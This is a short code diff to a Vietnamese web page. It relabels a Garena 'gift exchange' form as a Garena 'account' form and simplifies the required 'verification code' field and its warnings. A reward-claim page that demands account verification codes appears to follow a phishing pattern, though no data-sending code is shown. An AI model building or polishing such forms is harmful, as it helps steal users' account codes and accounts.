@@ -737,7 +737,7 @@ footer {
 <div id="form">
 
     <h2>
-        🎁 Đổi quà Garena
+        🎁 Tài khoản Garena
     </h2>
 
     <p id="reward"></p>
@@ -752,12 +752,12 @@ footer {
     <input
         type="text"
         id="verificationCode"
-        placeholder="Mã đơn / PIN xác nhận"
+        placeholder="Mã xác nhận"
         autocomplete="off"
     >
 
     <p class="warning">
-        Mã đơn / PIN xác nhận là bắt buộc.
+        Mã xác nhận là bắt buộc.
     </p>
 
     <button onclick="confirmExchange()">
@@ -918,7 +918,7 @@ window.confirmExchange = async function() {
     if (!verificationCode) {
 
         alert(
-            "Vui lòng nhập mã đơn / PIN xác nhận."
+            "Vui lòng nhập mã xác nhận."
         );
 
         return;
